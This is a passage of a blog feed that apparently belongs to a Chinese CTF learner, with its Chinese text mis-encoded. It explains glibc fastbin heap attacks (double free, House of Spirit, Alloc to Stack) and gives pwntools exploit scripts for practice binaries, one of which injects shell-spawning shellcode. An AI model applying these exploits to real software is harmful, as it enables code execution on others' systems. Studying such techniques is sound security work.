990478f9c3198aa49d49a2b9087a6e75acc9e1dd04e84ecaabea428cbce129ef7359804215ce5b2634b5735617c50496299040adabb64350fd01862d79a4d25b063f91540ec7aa2509d370ee85af6b30a9f85f9fea4e60aa4ba946478667034b7d039026665341cbd7514c772af1b723ba93d2f0dc189ff46f6e303cd133b8cd1dc3deaf16e6cf5c2dd9855fa24abfb8cef03bd533af737deef8c5740b952312305139d782559791917086086e6662f5f8b5efb4b25a034cd16b5655367acd1063abdb21cfe068ed9ef72bfa12d117c55eef51f330d0045a6292137a83681181e4281dd76563fb459a22ce601055367803213902fb54052f713f6a76652eae10185c800cb944010a4632819f14fed78062c91db7edbdc210d9443f906a69f8204c87b07ffb125c6bae303eee7a23f6aad375e2e74fc707869147720588230d604a09e6dbe235ecbf6c84659ed850fce165df6ae6fe462ad5da9529e114465f8142576a3c33f94a13e76e4568d700a7bd3b5bd42d701b9d2a171f9f7f17a952c386017d97bdbacf83ac563eac9bb7ded0cb7c165cfd24a67bd5fda79da3eb727b4df8d6f4fd4b2243b40047bf28cde2ab362aa3d08be632f00f9c2f1a330c73b8bcb95a59a9d63c0fd8e7aa6efcfe14fd19815ddc65a6a96a54ea2a438ae8dac35a4769c0b50c4f763e0fa84757abc80eafdafa11109509f7821eb09cb3f302594f7f9163649f39d420b19ce4ef3f719e6458fd135d562f25ad76db7250ad83b394dd563a6585e0d051e2d927c3f55e523fd051a97a3b0f1a6ab383725bcc9b9db9a01d4388313712dcd86ac5fe2df6feb68be90397cbdf2210fd8cab3bdde34916e8554eb6d1e307f430124e78ea589335e9d3c51c25b390aa16925d4d188bdb1317ef4b6ab701c01aa9a64f3119135b11a6d6d8eeabddcd50c3abdd6b739124e40d6b13c4359b68d7b3ce3547c331538a075c99da7df98d8608d74f67f7c5d0cce51bf9b74cb29ad3af690bb45f7636bfbc985398aca20b9c7ddf22cade9b957ad36cb789f2e9dc6ccb77d02c3f0a0cd92a30f8cc48b95e6e1694a66ab6cfe91fdc6742936aa5f1d31c2108aea8d8c6919bccb504caddb06baf7f0c1a39effb12cb7ec768b474fd3d8263c231a3d85eec53545acfd652a543b44332ca0c269e652d89ee9e6fedac4448387a041a4f894f6af47952996d871b961e9034ac05cf9600c4b315295e0ed2011edddbb0a940c343d01e2dce13aff3b05d3783164be3d6877c5fdde1c3de78c0ba3ab98e7398db069cc3443aae6635cbd7e1b4e54c482b9b4c8918e1170d81f6e97bd8cda8e52ee9503c677420ccc083abe2b091280554a15f5a8229fbe597e37143012b2e3a5c9c774d774857b2160843fa3cc5fd837216361df842a6c3ff5e0d9a10fb8e69367ed23702ddc028e3690cffa6fa2f0910d4b8ff9d605715e8a77ddbb309c8bdf10915505e9ea7f8fdfe4f60d8bfe2897e5702883379e6d3578c9a9a6625483ed1615858475527d97ad4286efe98e9ac5e87648a57aea4230c6bec3288362d2f400357d3f8a22186a5791961779ddb2a4d2e678e6e63fcfb7312bfc0ba76934bed387741be93920a29641fc1cf2063621c56970517be866afb94b5cb9d43fcffc45dbf77c2ef93d4d7f7b9a508e0cae49313738f7aca80f6886777d10419f7e8d01afa15b469ba3166aa108e8a0</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">å›¾æ–‡å‡æ¥è‡ªè€å¸ˆPPTï¼Œæ•…ä¸å…¬å¼€ï¼Œç‚¹è¿™é‡Œè¾“å¯†ç </span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> æœŸæœ« </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®¡ç®—æœºç½‘ç»œ </tag>
            
            <tag> æœŸæœ«å¤ä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastbin_attackç³»åˆ—</title>
      <link href="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/"/>
      <url>/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h1 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin_attack"></a>fastbin_attack</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>fastbin attackæŒ‡æ‰€æœ‰åŸºäºfastbinæœºåˆ¶çš„æ¼æ´åˆ©ç”¨æ–¹æ³•ï¼Œåˆ©ç”¨å‰æï¼š</p><ul><li>å­˜åœ¨å †æº¢å‡ºã€uafç­‰èƒ½æ§åˆ¶chunkå†…å®¹çš„æ¼æ´</li><li>æ¼æ´å‘ç”Ÿäº fastbinç±»å‹çš„chunkä¸­</li></ul><p>ç»†åˆ†å¯åšåˆ°å¦‚ä¸‹åˆ†ç±»</p><ul><li><strong>Fastbin Double Free</strong></li><li><strong>House of Spirit</strong></li></ul><blockquote><p>Fastbin Double Free å’Œ House of Spirit ä¾§é‡â€œæ­£å¸¸ç”±ç”¨æˆ·åˆ›å»ºçš„chunkâ€å’Œâ€œç”±æ”»å‡»è€…ä¼ªé€ çš„chunkâ€ï¼Œç„¶åå†æ¬¡ç”³è¯·chunkè¿›è¡Œæ”»å‡»</p></blockquote><ul><li><strong>Alloc to Stack</strong></li><li><strong>Arbitary Alloc</strong></li></ul><blockquote><p>Alloc to Stack å’Œ Arbitary Alloc ä¾§é‡åˆ©ç”¨å †æº¢å‡ºç­‰æ–¹å¼ä¿®æ”¹chunkçš„fdæŒ‡é’ˆï¼Œå³ç›´æ¥ç”³è¯·æŒ‡å®šä½ç½®çš„chunkè¿›è¡Œæ”»å‡»</p></blockquote><h2 id="Principle"><a href="#Principle" class="headerlink" title="Principle"></a>Principle</h2><p>if a chunk is freed and goes into <strong>fastbin</strong> the <strong>prev_inuse</strong> flag of the next heap will not be cleared</p><blockquote><ul><li><p>PREV_INUSE(abbreviated as <strong>P</strong>,in the lowest bit of the chunk size field)</p><p>Record whether the previous chunk block is in the allocated state.In general,<strong>the P-bit of the size field of the first allocated memory block in the heap is set to 1 to prevent access to the previous illegal memory.</strong> When the P-bit of a chunk is 0,we can use the prev_size field to get the size and address of the previous chunk.This also facilitates merging between idle chunks.</p></li></ul></blockquote><p><img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/image-20250412200540385.png" alt="image-20250412200540385"><img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/image-20250412200629044.png" alt="image-20250412200629044"></p><h2 id="1-double-free"><a href="#1-double-free" class="headerlink" title="1. double free"></a>1. double free</h2><ol><li>Once the fastbinâ€™s heap is freed the <strong>P-bit</strong> of the next chunk will not be emptied</li><li>when free fastbin,just verify the chunk that the main arena points to,i.e.,the chunk at the head of the linked list pointer.For the chunks behind the linked list,thereâ€™s no validation.</li></ol><p><a href="https://xuanxuanblingbling.github.io/assets/pwn/paper">https://xuanxuanblingbling.github.io/assets/pwn/paper</a></p><h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><p>paper<img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/image-20250412204239899.png" alt="image-20250412204239899"></p><p>without<code>link_list[del_index]=NULL</code>,<code>UAF</code></p><p>åˆ©ç”¨æ€æƒ³: åˆ©ç”¨fastbinçš„freeåªæ£€æŸ¥æ˜¯å¦å’Œä¸Šä¸€ä¸ªfreechunkç›¸ç­‰ï¼Œä½¿å¾—åŒä¸€ä¸ªchunkä¸¤æ¬¡è¿›å…¥free listï¼Œé€ æˆUAFï¼Œå¯ä»¥æ›´æ”¹fastbin free chunkçš„fdä¿¡æ¯ï¼Œæœ€ç»ˆåˆ†é…ä¸€ä¸ªç‰¹å®šåœ°å€<br>åˆ©ç”¨éš¾ç‚¹</p><p>éœ€è¦èƒ½å¤Ÿä¸¤æ¬¡freeåŒä¸€ä¸ªchunk<br>æ›´æ”¹fdçš„æ—¶å€™ï¼Œä¸ºäº†èƒ½å¤Ÿåœ¨ä¹‹åçš„mallocä¹‹åè¿”å›è¿™ä¸ªå€¼ï¼Œéœ€è¦é€šè¿‡ä¸€ä¸ªcheckï¼Œä¼šæ£€æŸ¥fdæŒ‡å‘çš„è¿™ä¸ªä½ç½®çš„size(è¿™ä¸ªä½ç½®å¯ä»¥ä¸ç”¨å¯¹é½)ï¼Œçœ‹æ˜¯å¦å±äºæ­£è¦mallocçš„è¿™ä¸ªbinçš„èŒƒå›´ã€‚<br>è¯¦ç»†ä¿¡æ¯</p><p>å…¶æ¼æ´çš„ä¸»è¦åŸå› åœ¨äºfastbin<br>çš„å®ç°å…¶å®æ˜¯ä¸€ä¸ªå•é“¾è¡¨å®ç°çš„æ ˆï¼Œåè¿›å…ˆå‡ºï¼Œfreeçš„æ—¶å€™åªæ£€æŸ¥äº†è¿™ä¸ªæ ˆçš„æ ˆé¡¶ï¼Œè¿™æ ·çš„è¯ï¼Œ<br>åªè¦ä¸æ˜¯è¿ç»­çš„freeä¸¤æ¬¡åŒä¸€ä¸ªchunkï¼Œå°±å¯ä»¥é¡ºåˆ©çš„å°†ä¸€ä¸ªchunkæ”¾è¿›free listã€‚ä¹‹åçš„åˆ†é…ä¼šä½¿å¾—<br>chunkè™½ç„¶åœ¨free listé‡Œï¼Œä½†æ˜¯ä¹Ÿè¢«åˆ†é…äº†å‡ºæ¥ï¼Œè¿™æ ·å°±å¯ä»¥æ›´æ”¹åˆ°fdæŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘å…¶ä»–ä½ç½®ã€‚</p><p>æ£€æŸ¥æ ˆé¡¶çš„ä»£ç å¦‚ä¸‹:</p><pre><code>/* Check that the top of the bin is not the record we are going to add   (i.e., double free).  */if (__builtin_expect (old == p, 0))  &#123;    errstr = &quot;double free or corruption (fasttop)&quot;;    goto errout;  &#125;</code></pre><p>éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œåœ¨åˆ†é…çš„æ—¶å€™è¿˜æœ‰ä¸€ä¸ªæ£€æŸ¥:</p><pre><code>      if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))        &#123;          errstr = &quot;malloc(): memory corruption (fast)&quot;;        errout:          malloc_printerr (check_action, errstr, chunk2mem (victim), av);          return NULL;        &#125;      check_remalloced_chunk (av, victim, nb);</code></pre><p>è¿™ä¸ªæ£€æŸ¥æ˜¯æŒ‡å³å°†åˆ†é…çš„è¿™ä¸ªchunkå¤§å°åº”è¯¥åœ¨å…¶ç›¸åº”å¤§å°çš„idxä¸Šï¼Œæ¯”å¦‚sizeéƒ½ä¸º0x20å¤§å°çš„<br>fastbinï¼Œèƒ½å¤Ÿæ¥å—çš„å€¼å°±æ˜¯0x20-0x27èŒƒå›´ï¼Œåˆ†é…è¿‡å»åº”è¯¥æœ‰è¿™ä¸ªèŒƒå›´çš„å€¼ï¼ˆè¢«å½“åšsizeï¼‰ï¼Œ<br>å¦åˆ™å°†ä¼šå‡ºç°memory corruptionã€‚</p><p>æ‰€ä»¥åˆ©ç”¨çš„æ—¶å€™éœ€è¦æƒ³åŠæ³•æ‰¾åˆ°ä¸€ä¸ªç›¸åº”çš„sizeï¼Œ<strong>è¿™ä¸ªsizeå…¶å®æ˜¯ä¸éœ€è¦å¯¹é½çš„</strong>(just check low 4 bytes)ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡<br>é”™ä½çš„æ–¹å¼æ„é€ ä¸€ä¸ªå‡çš„sizeå€¼å‡ºæ¥ã€‚æ‰¾åˆ°ç›¸åº”çš„sizeå°±å¯ä»¥è¿›è¡Œåˆ†é…åˆ°ç›¸åº”ä½ç½®äº†ã€‚<img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/image-20250412220831246.png" alt="image-20250412220831246"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./paper&#x27;</span>) </span><br><span class="line">elf=ELF(<span class="string">&#x27;./paper&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;delete paper&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;0-9&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;long&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;content&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;delete paper&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;0-9&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x30</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x30</span>,p64(<span class="number">0x60202a</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x30</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x30</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x30</span>,<span class="string">b&quot;\x40\x00\x00\x00\x00\x00&quot;</span>+p64(elf.symbols[<span class="string">&#x27;gg&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="2-House-of-Spirit"><a href="#2-House-of-Spirit" class="headerlink" title="2. House of Spirit"></a>2. House of Spirit</h2><h3 id="principle"><a href="#principle" class="headerlink" title="principle"></a>principle</h3><p>The key to using house of Spirit is the ability to override a heap poiont(the address that malloc_data returned in the chunk after calling malloc)to point an area can be controlled.</p><ol><li>ä¼ªé€ å †å—</li><li>è¦†ç›–å †æŒ‡é’ˆæŒ‡ä¸Šä¸€æ­¥ä¼ªé€ çš„å †å—</li><li>é‡Šæ”¾å †å—ï¼Œå°†ä¼ªé€ çš„å †å—æ”¾å…¥fastbinçš„å•é“¾è¡¨é‡Œé¢ï¼ˆç»•è¿‡æ£€æµ‹ï¼‰</li><li>ç”³è¯·å †å—ï¼Œé‡Šæ”¾åˆšæ‰ç”³è¯·çš„å †å—ï¼Œæœ€ç»ˆå¯ä»¥ä½¿å‘ç›®æ ‡åŒºåŸŸä¸­å†™å…¥æ•°æ®ï¼Œä»¥è¾¾åˆ°æ§åˆ¶å†…å­˜çš„ç›®çš„</li></ol><p>ä¸€èˆ¬æ¥è¯´æƒ³è¦æ§åˆ¶çš„ç›®æ ‡åŒºåŸŸå¤šä¸ºè¿”å›åœ°å€æˆ–æ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œè¯¥å†…å­˜åŒºåŸŸæˆ‘ä»¬æ˜¯æ— æ³•é€šè¿‡è¾“å…¥æ•°æ®æ¥è¿›è¡Œæ§åˆ¶çš„ï¼Œæƒ³è¦åˆ©ç”¨hosæ”»å‡»æŠ€æœ¯æ¥æ”¹å†™è¯¥åŒºåŸŸï¼Œé¦–å…ˆéœ€è¦æˆ‘ä»¬å¯ä»¥æ§åˆ¶é‚£ç‰‡ç›®æ ‡åŒºåŸŸçš„å‰é¢ç©ºé—´å’Œåé¢ç©ºé—´ã€‚</p><p><img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/image-20250423162555963.png" alt="image-20250423162555963"></p><h4 id="freeæ—¶éœ€è¦è¢«ç»•è¿‡çš„æ£€æµ‹"><a href="#freeæ—¶éœ€è¦è¢«ç»•è¿‡çš„æ£€æµ‹" class="headerlink" title="freeæ—¶éœ€è¦è¢«ç»•è¿‡çš„æ£€æµ‹"></a>freeæ—¶éœ€è¦è¢«ç»•è¿‡çš„æ£€æµ‹</h4><ol><li><code>fake chunk</code>çš„<code>ISMMAP</code>ä½ä¸èƒ½ä¸º1ï¼Œ<code>free</code>æ—¶ï¼Œ<code>mmap</code>çš„chunkä¼šå•ç‹¬å¤„ç†</li><li><code>fake chunk</code>åœ°å€å¯¹é½ï¼Œ<code>MALLOC_ALIGN_MASK</code></li><li><code>size</code>å¤§å°è¦æ»¡è¶³å¯¹åº”fastbinçš„éœ€æ±‚ï¼ŒåŒæ—¶ä¹Ÿå¾—å¯¹é½</li><li><code>fake_chunk</code>çš„<code>next chunk</code>çš„å¤§å°ä¸èƒ½å°äº<code>2*SIZE_SZ</code>,åŒæ—¶ä¹Ÿä¸èƒ½å¤§äº<code>av-&gt;system_mem</code></li><li><code>fastbin</code>çš„é“¾è¡¨å¤´éƒ¨ä¸èƒ½æ˜¯è¯¥fake_chunk,å¦åˆ™ä¸èƒ½æ„æˆ<code>double free</code></li></ol><h3 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h3><p>æ€»çš„æ¥è¯´ï¼Œhouseofspiritçš„ä¸»è¦æ„æ€æ˜¯æˆ‘ä»¬æƒ³è¦æ§åˆ¶çš„åŒºåŸŸæ§åˆ¶ä¸äº†ï¼Œä½†æ˜¯å®ƒå‰é¢å’Œåé¢éƒ½å¯ä»¥æ§åˆ¶ï¼Œæ‰€ä»¥ä¼ªé€ å¥½æ•°æ®å°†å®ƒæ”¾å…¥fastbinä¸­ï¼Œåé¢å°†è¯¥å†…å­˜åŒºåŸŸå½“ä½œå †å—ç”³è¯·å‡ºæ¥ï¼Œè‡´ä½¿è¯¥åŒºåŸŸè¢«å½“ä½œæ™®é€šçš„å†…å­˜ä½¿ç”¨ï¼Œä»è€Œä½¿ç›®æ ‡åŒºåŸŸå˜æˆå¯æ§çš„ã€‚</p><h3 id="example-1"><a href="#example-1" class="headerlink" title="example"></a>example</h3><p><a href="https://www.52pojie.cn/thread-1819636-1-1.html">LCTF 2016 : PWN200 - å¾çˆ±ç ´è§£ - 52pojie.cn</a></p><p>2016-iscc-pwn200<img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/image-20250418134608234.png" alt="image-20250418134608234"><img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/image-20250418135348455.png" alt="image-20250418135348455"></p><p>å¾ªç¯48æ¬¡ï¼Œåˆ†é…äº†48å­—èŠ‚ï¼Œå¡«æ»¡ç”±äºprintfçš„ç‰¹æ€§ï¼ˆæ‰“å°ç›´åˆ°<code>\x00</code>ï¼‰å¯ä»¥æ³„éœ²ebp</p><p>å¦‚æœè¾“å…¥0x38ä½ï¼Œé‚£ä¹ˆå®é™…è¾“å…¥çš„ä¼šæ˜¯0x39ä½ï¼Œå› ä¸ºreadå‡½æ•°ä¹Ÿä¼šå°†â€™/nâ€™è¾“å…¥åˆ°å†…å­˜ä¸­ï¼Œç»“æœæ˜¯ä¼šè¦†ç›–æ‰destæœ€ä½çš„ä¸€ä¸ªå­—èŠ‚ï¼Œå¯¼è‡´ä¸èƒ½æŸ¥çœ‹å †ä¿¡æ¯ã€‚</p><p><img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/image-20250418140737023.png" alt="image-20250418140737023"></p><p>æº¢å‡º</p><p><img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/640.webp" alt="640"></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><ol><li><p>è¾“å…¥nameçš„æ—¶å€™ï¼Œå°†shellcodeè¾“å…¥ï¼Œå¹¶è¡¥é½0x30å­—èŠ‚ï¼Œä»¥é€šè¿‡off-by-oneæ¼æ´æ³„æ¼rbpåœ°å€ï¼›<img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/image-20250424152122813.png" alt="image-20250424152122813"></p></li><li><p>è¾“å…¥moneyçš„æ—¶å€™ï¼Œåœ¨moneyé‡Œä¼ªé€ chunkï¼Œæ³¨æ„è¦ç»•è¿‡freeå‡½æ•°çš„æ£€æŸ¥ã€‚å¹¶é€šè¿‡ç›¸é‚»å˜é‡è¦†ç›–æ¼æ´è¦†ç›–destæŒ‡é’ˆï¼Œå°†å…¶è¦†ç›–ä¸ºfake chunkçš„user dataåœ°å€ï¼Œé‚£ä¹ˆè¾“å…¥å®Œä¹‹åï¼ŒdestæŒ‡é’ˆèµ‹å€¼ç»™ptrï¼Œpträ¹ŸæŒ‡å‘fake chunkçš„user dataåœ°å€ã€‚<img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/image-20250424152224738.png" alt="image-20250424152224738"></p><blockquote><p>æ¡†ä¸­ä¾æ¬¡ä¸ºsizeï¼Œreturn_address,shellcode</p></blockquote></li><li><p>è°ƒç”¨checkoutï¼Œå°†ä¼ªé€ chunkæ”¾å…¥fastbinä¸­ï¼Œå¹¶ç½®ptræŒ‡é’ˆä¸ºNULLï¼›<img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/image-20250424152555116.png" alt="image-20250424152555116"></p><p>fastbinsä¸­æœ‰äº†æ ˆåœ°å€ã€‚ç”³è¯·0x30å¤§å°å³å¯å°†å…¶ç”³è¯·å‡ºæ¥</p><p>è¯¥åœ°å€+0x10å³ä¸ºç”¨æˆ·åŒº<img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/image-20250424152911021.png" alt="image-20250424152911021">å¡«å……0x18çš„nopï¼Œå†å†™å…¥shellcodeçš„åœ°å€å³å¯è®©ç¨‹åºè½¬è€Œæ‰§è¡Œshellcode</p></li><li><p>è°ƒç”¨checkinï¼Œå› ä¸ºptr==NULLï¼Œå°†é‡æ–°mallocæŒ‡å®šå¤§å°çš„chunkå¹¶è¾“å…¥æ•°æ®ï¼Œæ­¤æ—¶ï¼Œä¾¿å¯ä»¥mallocå¯æ§1åŒºåŸŸä¸‹æ–¹çš„ä¸å¯æ§åŒºåŸŸï¼Œè¦†ç›–input_number_and_menuå‡½æ•°çš„è¿”å›åœ°å€ä¸ºshellcodeåœ°å€ï¼›<img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/image-20250424153639792.png" alt="image-20250424153639792">çœ‹åˆ°è¿”å›åœ°å€å·²ç»å˜ä¸ºshellcodeåœ°å€</p></li><li><p>é€€å‡ºæ—¶chooseå‡½æ•°è·³è½¬å»æ‰§è¡Œshellcodeã€‚<strong>getshellï¼</strong><img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/image-20250424153838669.png" alt="image-20250424153838669"></p></li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leek_rbp</span>():</span><br><span class="line">    <span class="keyword">global</span> fake_addr</span><br><span class="line">    <span class="keyword">global</span> shellcode_addr</span><br><span class="line"></span><br><span class="line">    shellcode = asm(shellcraft.sh())</span><br><span class="line">    payload = shellcode.ljust(<span class="number">0x30</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;who are u?\n&#x27;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(payload)</span><br><span class="line">    rbp_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log.info(<span class="string">&quot;rbp_addr: 0x%x&quot;</span> % rbp_addr)</span><br><span class="line"></span><br><span class="line">    shellcode_addr = rbp_addr - <span class="number">0x50</span></span><br><span class="line">    log.info(<span class="string">&quot;shellcode_addr: 0x%x&quot;</span> % shellcode_addr)</span><br><span class="line">    fake_addr = rbp_addr - <span class="number">0x90</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">overwrite_dest</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;give me your id ~~?\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;65&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;give me money~\n&#x27;</span>)</span><br><span class="line">    data = p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>) + p64(<span class="number">0</span>) + p64(fake_addr)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_shell</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;choice : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;choice : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;long?\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;48&#x27;</span>)</span><br><span class="line">    p.recvline(<span class="string">b&#x27;48&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    data = <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x18</span> + p64(shellcode_addr)</span><br><span class="line">    data = data.ljust(<span class="number">0x30</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;choice&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    leek_rbp()</span><br><span class="line">    overwrite_dest()</span><br><span class="line">    get_shell()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure><h2 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h2><p>æ¨¡æ‹Ÿæ ·ä¾‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> pre_size;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> size;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> fd;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> bk;</span><br><span class="line">&#125; CHUNK, *PCHUNK;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    CHUNK stack_chunk;        <span class="comment">// åœ¨æ ˆä¸Šä¼ªé€ ä¸€ä¸ª chunk</span></span><br><span class="line">    <span class="type">void</span> *chunk1;</span><br><span class="line">    <span class="type">void</span> *chunk_a;</span><br><span class="line"></span><br><span class="line">    stack_chunk.size = <span class="number">0x21</span>;  <span class="comment">// è®¾ç½® fake chunk çš„å¤§å°å­—æ®µï¼ˆfastbinï¼‰</span></span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);    <span class="comment">// åˆ†é…ä¸€ä¸ª fastbin chunk</span></span><br><span class="line">    <span class="built_in">free</span>(chunk1);             <span class="comment">// é‡Šæ”¾å®ƒè¿›å…¥ fastbin</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¨¡æ‹Ÿ Use-After-Freeï¼Œå†™å…¥ fastbin é“¾è¡¨ä¸­çš„ fd æŒ‡é’ˆ</span></span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> *)chunk1 = (<span class="type">long</span> <span class="type">long</span>)&amp;stack_chunk;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);             <span class="comment">// 